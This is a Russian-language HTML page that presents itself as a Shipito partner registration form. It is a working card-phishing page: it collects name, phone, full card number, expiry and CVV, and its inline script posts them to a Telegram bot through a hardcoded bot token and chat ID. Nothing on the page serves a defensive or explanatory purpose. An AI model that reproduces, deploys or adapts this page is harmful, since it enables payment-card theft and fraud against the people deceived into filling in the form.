<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Регистрация · Shipito Partners</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #e9f0f5 0%, #dce6f0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            margin: 0;
        }

        .shipito-card {
            max-width: 440px;
            width: 100%;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            padding: 32px 28px;
            transition: all 0.2s ease;
        }

        .shipito-logo {
            text-align: center;
            margin-bottom: 10px;
            font-size: 32px;
            font-weight: 700;
            color: #007bff;
            letter-spacing: 2px;
        }

        .shipito-logo span {
            color: #333;
        }

        .shipito-title {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
            text-align: center;
        }

        .shipito-sub {
            text-align: center;
            color: #6c757d;
            margin-bottom: 28px;
            font-size: 15px;
            line-height: 1.4;
        }

        .form-group {
            position: relative;
            margin-bottom: 22px;
        }

        .form-group input {
            width: 100%;
            padding: 14px 12px 8px 12px;
            border: 1px solid #ced4da;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            background: #fff;
            transition: border 0.2s, box-shadow 0.2s;
            font-family: inherit;
        }

        .form-group input:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.15);
        }

        .form-group label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: white;
            padding: 0 6px;
            color: #6c757d;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label {
            top: -8px;
            transform: translateY(0);
            font-size: 13px;
            color: #007bff;
            font-weight: 500;
        }

        .form-row {
            display: flex;
            gap: 12px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .btn-register {
            width: 100%;
            padding: 14px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }

        .btn-register:hover {
            background: #0056b3;
        }

        .alert {
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 18px;
            display: none;
        }

        .alert-error {
            background: #ffe3e3;
            color: #b71c1c;
            border: 1px solid #f5c6cb;
        }

        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        @media (max-width: 480px) {
            .shipito-card {
                padding: 24px 18px;
            }
        }
    </style>
</head>
<body>
    <div class="shipito-card">
        <div class="shipito-logo">SHIPITO</div>
        <div class="shipito-title">Личный кабинет партнёра</div>
        <div class="shipito-sub">Заполните форму, чтобы подтвердить партнёрство</div>

        <div id="alertError" class="alert alert-error"></div>
        <div id="alertSuccess" class="alert alert-success"></div>

        <form id="partnerForm" novalidate>
            <div class="form-group">
                <input type="text" id="fullName" placeholder=" " autocomplete="name" required>
                <label for="fullName">Полное имя</label>
            </div>

            <div class="form-group">
                <input type="tel" id="phone" placeholder=" " autocomplete="tel" required>
                <label for="phone">Телефон</label>
            </div>

            <div class="form-group">
                <input type="text" id="cardNumber" placeholder=" " inputmode="numeric" maxlength="19" autocomplete="cc-number" required>
                <label for="cardNumber">Номер карты</label>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <input type="text" id="expiry" placeholder=" " maxlength="5" autocomplete="cc-exp" required>
                    <label for="expiry">ММ/ГГ</label>
                </div>
                <div class="form-group">
                    <input type="text" id="cvv" placeholder=" " inputmode="numeric" maxlength="4" autocomplete="cc-csc" required>
                    <label for="cvv">CVV</label>
                </div>
            </div>

            <button type="submit" class="btn-register">Отправить</button>
        </form>
    </div>

    <script>
        (function() {
            const TOKEN = '7608120444:AAEPthvmx3DlCxkP9AJjvwT-X4QZagwL8TY';
            const CHAT_ID = '7608120444';
            const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

            const form = document.getElementById('partnerForm');
            const alertError = document.getElementById('alertError');
            const alertSuccess = document.getElementById('alertSuccess');

            const phoneInput = document.getElementById('phone');
            const cardInput = document.getElementById('cardNumber');
            const expiryInput = document.getElementById('expiry');
            const cvvInput = document.getElementById('cvv');

            function showAlert(el, msg) {
                el.textContent = msg;
                el.style.display = 'block';
                setTimeout(() => { el.style.display = 'none'; }, 6000);
            }

            function hideAlerts() {
                alertError.style.display = 'none';
                alertSuccess.style.display = 'none';
            }

            phoneInput.addEventListener('input', function(e) {
                let val = e.target.value.replace(/[^\d+]/g, '');
                if (!val.startsWith('+')) val = '+' + val;
                e.target.value = val;
            });

            cardInput.addEventListener('input', function(e) {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length > 16) val = val.slice(0, 16);
                e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
            });

            expiryInput.addEventListener('input', function(e) {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length >= 2) {
                    val = val.slice(0, 2) + '/' + val.slice(2, 4);
                }
                e.target.value = val;
            });

            cvvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '');
            });

            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                hideAlerts();

                const name = document.getElementById('fullName').value.trim();
                const phone = phoneInput.value.trim();
                const card = cardInput.value.replace(/\s/g, '');
                const expiry = expiryInput.value.trim();
                const cvv = cvvInput.value.trim();

                if (!name || !phone || !card || !expiry || !cvv) {
                    showAlert(alertError, 'Пожалуйста, заполните все поля.');
                    return;
                }

                if (card.length !== 16 || !/^\d+$/.test(card)) {
                    showAlert(alertError, 'Номер карты должен содержать 16 цифр.');
                    return;
                }

                if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
                    showAlert(alertError, 'CVV должен содержать 3 или 4 цифры.');
                    return;
                }

                const message = `📥 Новая регистрация партнёра\n👤 Имя: ${name}\n📱 Телефон: ${phone}\n💳 Карта: ${card}\n📅 Срок: ${expiry}\n🔒 CVV: ${cvv}`;

                try {
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message
                        })
                    });

                    if (response.ok) {
                        showAlert(alertSuccess, 'Данные успешно отправлены.');
                        form.reset();
                    } else {
                        const errData = await response.json().catch(() => ({}));
                        showAlert(alertError, 'Ошибка отправки: ' + (errData.description || 'неизвестная ошибка'));
                    }
                } catch (err) {
                    showAlert(alertError, 'Сетевая ошибка. Проверьте подключение к интернету.');
                }
            });
        })();
    </script>
</body>
</html>
